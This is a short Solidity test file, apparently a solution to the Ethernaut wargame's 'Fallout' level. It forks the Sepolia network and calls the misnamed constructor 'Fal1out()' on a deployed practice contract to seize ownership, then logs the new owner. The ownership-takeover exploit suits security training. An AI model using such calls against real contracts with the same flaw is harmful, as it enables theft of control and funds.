// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/console.sol";
import "../src/levels/02-Fallout/Fallout.sol";

contract ContractTest2 is DSTest {
    // creating an instance of the "Fallout" contract
    //  The contract is located at the Ethereum address 0x0c1b7115e2E6e37C71306850e864A68b347ae969.
    Fallout level2 =
        Fallout(payable(0x0c1b7115e2E6e37C71306850e864A68b347ae969));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));
    }

    function testExploit2() public {
        level2.Fal1out();
        console.log(level2.owner());
        console.log(address(this));
    }
    receive() external payable {}
}
